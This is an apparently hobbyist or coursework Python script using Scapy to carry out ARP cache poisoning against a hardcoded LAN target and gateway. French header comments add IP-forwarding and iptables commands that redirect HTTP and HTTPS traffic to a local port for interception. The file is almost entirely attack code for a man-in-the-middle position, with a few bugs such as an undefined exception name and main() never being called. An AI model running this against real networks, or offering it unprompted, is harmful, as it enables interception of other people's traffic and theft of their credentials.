# installer npcap sur windows
# sur linux: l'attaquant doit forwarder les paquets: sudo sysctl -w net.ipv4.ip_forward=1
# sur linux: l'attaquant foit écrire des règle de prerouting pour rediriger les ports: 
## sudo iptables -t nat -A PREROUTING -i INTERFACE_NAME -p tcp --dport 80 -j REDIRECT --to-port 8080
## sudo iptables -t nat -A PREROUTING -i INTERFACE_NAME -p tcp --dport 443 -j REDIRECT --to-port 8080
import sys
import threading
from queue import Queue
import time
from scapy.all import *
from scapy.layers.l2 import ARP

INTERFACE_NAME = "Intel(R) Ethernet Connection (7) I219-V"
INTERFACE = IFACES.dev_from_name(INTERFACE_NAME)
attacker_MAC = get_if_hwaddr(INTERFACE)
TARGET = "192.168.1.21"
GATEWAY = "192.168.1.44"

def get_MAC(iface, target):

    source_IP = get_if_addr(iface)
    source_MAC = get_if_hwaddr(iface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)
    p.hwdst = "ff:ff:ff:ff:ff:ff"
    p.pdst = target
    reply, non_reply = sr(p, timeout=5, verbose=0)
    if len(non_reply) > 0:
        raise Exception(f"Error finding MAC for {target}, try using -i")
    return reply[0][1].hwsrc

def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    # op=2 is ARP response
    # psrc/hwsrc is the data we want the destination to have
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)

def restore_ARP(target, gateway):
    print("Stopping the attack, restoring ARP cache")
    
    send_ARP(target["IP"], target["MAC"], gateway["IP"], gateway["MAC"])
    send_ARP(gateway["IP"], gateway["MAC"], target["IP"], target["MAC"])

    print("Restored ARP caches")

def start_poison_thread(target, gateway, control_queue):
    finish = False

    print("start poisoning")
    while not finish:
        while control_queue.empty():
            send_ARP(target["IP"], target["MAC"], gateway["IP"], attacker_MAC)
            send_ARP(gateway["IP"], gateway["MAC"], target["IP"], attacker_MAC)
            time.sleep(1)

        # queue not empty, pull the element out of the queue to empty it again
        try:
            cmd = control_queue.get(block=False)
        except Empty:
            print("Something broke")

        if cmd == "quit":
            finish = True

    print("stop poisoning")
    restore_ARP(target, gateway)

def main():
    control_queue = Queue.Queue()
    print(f"using interface {INTERFACE_NAME} ({attacker_MAC})")
    try:
        target = {"IP": TARGET, "MAC": get_MAC(INTERFACE, TARGET)}
        print(f"ARP: {target['IP']} is at {target['MAC']}")
    except Exception as e:
        print(e)
        sys.exit(1)

    try:
        gateway = {"IP": GATEWAY, "MAC": get_MAC(INTERFACE, GATEWAY)}
        print(f"ARP: {gateway['IP']} is at {gateway['MAC']}")
    except Exception as e:
        print(e)
        sys.exit(2)


    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(target, gateway, control_queue))
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(1)
            command = input('quit ? y/n :')
            if command == "y":
                control_queue.put("quit")
                poison_thread.join()

    except KeyboardInterrupt:
        control_queue.put("quit")
        poison_thread.join()

if __name__ == '__main__':
    print(get_MAC(INTERFACE, TARGET))